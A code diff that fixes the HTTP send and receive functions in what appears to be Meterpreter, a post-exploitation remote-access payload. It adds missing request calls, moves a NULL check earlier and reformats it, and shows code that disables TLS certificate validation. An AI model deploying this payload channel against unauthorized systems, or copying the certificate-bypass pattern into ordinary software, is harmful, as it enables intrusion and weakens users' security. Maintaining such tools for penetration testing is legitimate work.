@@ -1129,12 +1129,19 @@ DWORD packet_transmit_via_http_wininet(Remote *remote, Packet *packet, PacketReq
 
 		hReq = HttpOpenRequest(remote->hConnection, "POST", remote->uri, NULL, NULL, NULL, flags, 0);
 
-		if (hReq == NULL) {			dprintf("[PACKET RECEIVE] Failed HttpOpenRequest: %d", GetLastError());			SetLastError(ERROR_NOT_FOUND);			break;		}
+		if (hReq == NULL) {
+			dprintf("[PACKET RECEIVE] Failed HttpOpenRequest: %d", GetLastError());
+			SetLastError(ERROR_NOT_FOUND);
+			break;
+		}
+
 		if (remote->transport == METERPRETER_TRANSPORT_HTTPS) {
 			InternetQueryOption( hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, &flen);
 			flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
 			InternetSetOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, flen);
 		}
+
+		hRes = HttpSendRequest(hReq, NULL, 0, buffer, packet->payloadLength + sizeof(TlvHeader) );
 
 		if (! hRes) {
 			dprintf("[PACKET RECEIVE] Failed HttpSendRequest: %d", GetLastError());
@@ -1350,14 +1357,19 @@ DWORD packet_receive_http_via_wininet(Remote *remote, Packet **packet) {
 		dprintf("[PACKET RECEIVE] HttpOpenRequest");
 		hReq = HttpOpenRequest(remote->hConnection, "POST", remote->uri, NULL, NULL, NULL, flags, 0);
 
+		if (hReq == NULL) {
+			dprintf("[PACKET RECEIVE] Failed HttpOpenRequest: %d", GetLastError());
+			SetLastError(ERROR_NOT_FOUND);
+			break;
+		}
+
 		if (remote->transport == METERPRETER_TRANSPORT_HTTPS) {
 			InternetQueryOption( hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, &flen);
 			flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
 			InternetSetOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, flen);
 		}
-
-		if (hReq == NULL) {			dprintf("[PACKET RECEIVE] Failed HttpOpenRequest: %d", GetLastError());			SetLastError(ERROR_NOT_FOUND);			break;		}
-
+		
+		hRes = HttpSendRequest(hReq, NULL, 0, "RECV", 4 );
 		if (! hRes) {
 			dprintf("[PACKET RECEIVE] Failed HttpSendRequest: %d", GetLastError());
 			SetLastError(ERROR_NOT_FOUND);
